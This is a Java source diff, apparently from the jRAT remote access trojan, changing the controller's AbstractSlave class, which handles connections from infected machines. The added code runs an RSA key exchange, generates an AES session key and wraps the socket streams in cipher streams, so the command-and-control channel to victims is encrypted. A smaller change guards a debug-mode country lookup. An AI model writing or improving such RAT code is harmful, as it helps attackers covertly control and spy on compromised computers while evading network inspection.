@@ -6,8 +6,14 @@ import java.net.Socket;
 import java.security.PublicKey;
 import java.util.Random;
 
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
 import javax.swing.ImageIcon;
 
+import se.jrat.client.crypto.GlobalKeyPair;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.io.CountingInputStream;
 import se.jrat.client.io.CountingOutputStream;
@@ -24,6 +30,8 @@ import se.jrat.client.utils.Utils;
 import se.jrat.common.Version;
 import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
+import se.jrat.common.crypto.CryptoUtils;
+import se.jrat.common.crypto.KeyExchanger;
 
 import com.redpois0n.oslib.Distro;
 import com.redpois0n.oslib.OperatingSystem;
@@ -88,7 +96,9 @@ public abstract class AbstractSlave implements Runnable {
 		
 		if (Main.debug) {
 			String randomCountry = SampleMode.randomCountry();
-			setCountry(randomCountry);
+			if (randomCountry != null) {
+				setCountry(randomCountry);
+			}
 		} else if (Settings.getGlobal().getBoolean("geoip")) {
 			Country country = FlagUtils.getCountry(this);
 
@@ -106,6 +116,35 @@ public abstract class AbstractSlave implements Runnable {
 		}
 
 		PanelMainLog.getInstance().addEntry("Connect", this, "");
+		
+		KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
+		exchanger.writePublicKey();
+		exchanger.readRemotePublicKey();
+		rsaKey = exchanger.getRemoteKey();
+		
+        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+        keyGen.init(128);
+        SecretKey secretKey = keyGen.generateKey();
+
+        key = secretKey.getEncoded();
+        byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
+        dos.writeInt(encryptedKey.length);
+        dos.write(encryptedKey);
+		
+		if (Main.debug) {
+			Main.debug("Encryption key: " + Hex.encode(key));
+		}
+
+		this.outputStream.write(encryption ? 1 : 0);
+
+		Cipher inCipher = CryptoUtils.getCipher(Cipher.DECRYPT_MODE, secretKey);
+		Cipher outCipher = CryptoUtils.getCipher(Cipher.ENCRYPT_MODE, secretKey);
+		
+		this.inputStream = new CountingInputStream(new CipherInputStream(socket.getInputStream(), inCipher));
+		this.outputStream = new CountingOutputStream(new CipherOutputStream(socket.getOutputStream(), outCipher));
+
+		this.dis = new DataInputStream(inputStream);
+		this.dos = new DataOutputStream(outputStream);
 	}
 
 	public AbstractSlave(String ip) {
@@ -439,6 +478,7 @@ public abstract class AbstractSlave implements Runnable {
 	}
 
 	public OperatingSystem getOS() {
+		//
 		String os = this.getOperatingSystem().toLowerCase();
 		return OperatingSystem.getOperatingSystem(os);
 	}
